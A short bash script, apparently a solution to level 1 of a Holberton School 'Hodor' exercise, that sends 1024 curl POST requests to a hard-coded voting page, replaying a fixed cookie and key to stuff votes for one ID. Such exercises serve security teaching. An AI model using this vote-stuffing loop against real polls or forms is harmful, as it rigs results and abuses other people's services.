#!/bin/bash

# ===---Hodor Level 1-------------------------------------------------------------===
# Solution in Shell Script for Hodor Project by Julien Barbier - Holberton School
# Using curl command taking advantage of its default 'keep-alive' connection.
# If you want to see more details about each request replace the "s" option with "v"
# right after the 'curl' command.	
# ===-----------------------------------------------------------------------------===

URL=http://173.246.108.142/level1.php
ID='id=23'
COOKIE='990aede99b2115451d612b8c50ae6332a8026b62'
AGENT='havk64 - Curl requests'
HEADER="HoldTheDoor=$COOKIE"
COUNT=0
VOTES=1024

### Voting 1024 times:
while [ $COUNT -lt $VOTES ]
do
    curl -v -d "$ID&holdthedoor=submit&key=$COOKIE" -A "$AGENT" -b $HEADER  $URL -o /dev/null
    echo "Vote: "$COUNT
    ((COUNT++))
done


